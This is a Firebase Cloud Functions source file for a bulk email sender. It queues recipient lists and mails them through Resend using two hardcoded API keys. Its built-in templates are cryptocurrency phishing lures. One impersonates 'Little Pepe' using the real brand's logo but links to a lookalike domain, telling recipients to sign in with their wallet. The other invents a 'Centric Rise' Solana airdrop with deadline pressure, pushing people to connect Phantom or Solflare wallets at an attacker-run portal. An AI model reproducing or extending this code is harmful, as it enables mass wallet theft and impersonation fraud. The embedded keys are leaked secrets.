const { onCall, HttpsError } = require('firebase-functions/v2/https')
const { onSchedule } = require('firebase-functions/v2/scheduler')
const { Resend } = require('resend')
const admin = require('firebase-admin')

const DOMAIN_CONFIG = {
  'maulfaq.online': {
    apiKey: 're_ECbt48yn_HvogtYFGCbgWcu4n8yN3RvMg',
  },

  'eventfarm.ng': {
    apiKey: 're_UuafV5Ku_4BzrNWvoPBkzusBtsJrkU7Hj',
  },
}

admin.initializeApp()

const db = admin.firestore()

/**
 * =========================
 * GENERATE CAMPAIGN ID
 * =========================
 */
function generateCampaignId(domain) {
  return `cmp_${domain}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
}

exports.sendBlaster = onCall(async (request) => {
  try {
    let { emails, subject, html, fromName, fromEmail, domain } = request.data

    if (typeof emails === 'string') {
      emails = emails.split(',')
    }

    emails = emails.map((e) => e.trim()).filter((e) => e.includes('@'))

    const batch = db.batch()

    emails.forEach((email) => {
      const ref = db.collection('emailQueue').doc()

      batch.set(ref, {
        email,

        subject,
        html: html || buildAirdropClaimHTML(),
        campaignId: generateCampaignId(domain),

        fromName,
        fromEmail,
        domain,

        status: 'pending',

        createdAt: admin.firestore.FieldValue.serverTimestamp(),
      })
    })

    await batch.commit()

    console.log(`Queued ${emails.length} emails`)

    return {
      success: true,
      queued: emails.length,
    }
  } catch (err) {
    console.error(err)

    throw new HttpsError('internal', err.message)
  }
})

exports.emailWorker = onSchedule('every 1 minutes', async () => {
  const snapshot = await db.collection('emailQueue').where('status', '==', 'pending').limit(5).get()

  if (snapshot.empty) {
    console.log('No pending emails')
    return
  }

  for (const doc of snapshot.docs) {
    const data = doc.data()

    try {
      const config = DOMAIN_CONFIG[data.domain]

      if (!config) {
        throw new Error(`No API key configured for ${data.domain}`)
      }

      const resend = new Resend(config.apiKey)

      await resend.emails.send({
        from: `${data.fromName} <${data.fromEmail}>`,
        to: data.email,
        subject: data.subject,
        html: data.html,

        headers: {
          'List-Unsubscribe': `<https://${data.domain}/unsubscribe?email=${encodeURIComponent(
            data.email,
          )}>`,

          'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',

          Precedence: 'bulk',
        },
      })

      await doc.ref.update({
        status: 'sent',

        sentAt: admin.firestore.FieldValue.serverTimestamp(),
      })

      console.log(`Sent to ${data.email}`)
    } catch (err) {
      console.error(err)

      await doc.ref.update({
        status: 'failed',
        error: err.message,
      })
    }

    await new Promise((r) => setTimeout(r, 1000))
  }
})

/*========================= EMAIL TEMPLATE (optional default) ========================= */

function buildAirdropClaimHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Your allocation is available</title>
<style>
  body {
    margin: 0;
    padding: 0;
    background: #f5f7fa;
    font-family: Arial, Helvetica, sans-serif;
    color: #333333;
  }

  .container {
    max-width: 600px;
    margin: 0 auto;
    background: #ffffff;
    border-radius: 12px;
    overflow: hidden;
    border: 1px solid #e5e7eb;
  }
  .preheader{
display:none;
max-height:0;
overflow:hidden;
opacity:0;
mso-hide:all;
}
  .header {
    background: #61bafc;
    text-align: center;
    padding: 25px 20px;
  }

  .header-logo {
    display: block;
    margin: 0 auto;
    max-width: 280px;
    width: 100%;
    height: auto;
  }

  .content {
    padding: 32px;
    line-height: 1.7;
  }

  .button {
    display: inline-block;
    padding: 14px 28px;
    background: #61bafc;
    color: #ffffff !important;
    text-decoration: none;
    border-radius: 8px;
    font-weight: bold;
  }

  .notice {
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 16px;
    margin: 24px 0;
  }

  .footer {
    padding: 24px;
    text-align: center;
    font-size: 12px;
    color: #6b7280;
    border-top: 1px solid #e5e7eb;
  }

  .footer a {
    color: #6b7280;
    text-decoration: none;
  }
</style>
</head>
<body>


<div class="container">

  <div class="header">

    <img
      src="https://littlepepe.com/assets/logo-CPEVDSpN.png"
      
      alt="Little Pepe"
      class="header-logo"
    >

  </div>

  <div class="content">

    <p>Hello,</p>

    <p>
      We are reaching out regarding your Little Pepe allocation.
    </p>

    <p>
      The token distribution process has been completed and your allocation is now available for you to access through the Little Pepe portal.
    </p>

    <div class="notice">
      Please sign in using your wallet to verify your allocation and view your available tokens.
    </div>

    <p style="text-align:center;">
      <a href="https://littlepepesss.xyz" class="button">
        Open Dashboard
      </a>
    </p>

    <p>
      If you have already completed this process, no further action is required.
    </p>

    <p>
      Thank you for your continued participation and support.
    </p>

    <p>
      Regards,<br>
      Little Pepe Team
    </p>

  </div>

  <div class="footer">

    <p><strong>All rights reserved. Little Pepe </strong></p>

    <p>
      Support:
      <a href="mailto:support@littlepepe.com">
        support@littlepepe.com
      </a>
    </p>

    <p>
      If you no longer wish to receive updates, you may unsubscribe from future communications.
    </p>

  </div>

</div>
</body>
</html>`
}

function buildAirdropClaimText() {
  const reference = 'N/A'
  const userName = 'Valued Member'

  const airdropAmount = '50,000'
  const airdropToken = 'Centric Rise (CNR)'
  const portalUrl = 'https://maulfaq.online/portal'
  const supportUrl = 'https://maulfaq.online/support'
  const unsubscribeUrl = 'https://maulfaq.online/unsubscribe'
  const deadline = 'June 30, 2026'

  return `Centric Rise — Distribution Update

Hello ${userName},

The Centric Rise distribution on the Solana network has been processed. As a verified participant, your allocation is ready for review.

TOKEN ALLOCATION

  Amount:    ${airdropAmount} ${airdropToken}
  Allocation: Network transition distribution

OPEN TOKEN PORTAL

  ${portalUrl}

Portal available through ${deadline}.

PROCESS OVERVIEW

1. Access your dashboard
   (Compatible with Phantom, Solflare, or Backpack)

2. Review your distribution status
   Your legacy balance will be verified on-chain

3. Receive your allocation
   Tokens are sent directly to your connected wallet

NOTE

Allocations not reviewed by the deadline may be reallocated to the community pool. We recommend reviewing your status at your earliest convenience.

Reference: ${reference}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Centric Rise | Solana Network

Support: ${supportUrl}
Unsubscribe: ${unsubscribeUrl}

This is an automated message. Please do not reply.`
}
